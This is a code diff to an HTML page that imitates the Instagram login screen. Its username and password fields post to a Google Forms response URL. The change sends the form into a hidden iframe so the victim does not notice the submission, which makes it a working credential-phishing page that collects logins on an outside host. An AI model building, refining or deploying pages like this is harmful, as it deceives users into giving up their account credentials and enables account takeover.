@@ -13,12 +13,13 @@
 			<div class="logo">
 				<img src="instagram.png" alt="instagram" style="width: 175px;">
 			</div>
-			<form class="form" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdaRHmXevYOs_DMJ3jc8iYe4h2mYKW9tczwLpqs8Gog7D1JWA/formResponse" target="_self" method="POST" id="mG61Hd" jsmodel="TOfxwf Q91hve CEkLOc" data-shuffle-seed="-5450906483263387292" data-response="%.@.[]]" data-dlp-data="%.@.null,false,[]]" data-first-entry="0" data-last-entry="2" data-is-first-page="true" >
+			<div id="error"></div>
+			<form class="form" id="form" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdaRHmXevYOs_DMJ3jc8iYe4h2mYKW9tczwLpqs8Gog7D1JWA/formResponse" method="post" target="hidden_iframe" onsubmit="submitted=true" >
 				<div class="input_field">
-					<input type="text" placeholder="Phone number, username, or email" class="input" name="entry.946314631" >
+					<input type="text" id="name" placeholder="Phone number, username, or email" class="input" name="entry.946314631" required>
 				</div>
 				<div class="input_field">
-					<input type="password" placeholder="Password" class="input" name="entry.1841389012">
+					<input type="password" id="pass" placeholder="Password" class="input" name="entry.1841389012">
 				</div>
 				<button class="btn"><a herf="#">Log In</a></button>
 			</form>
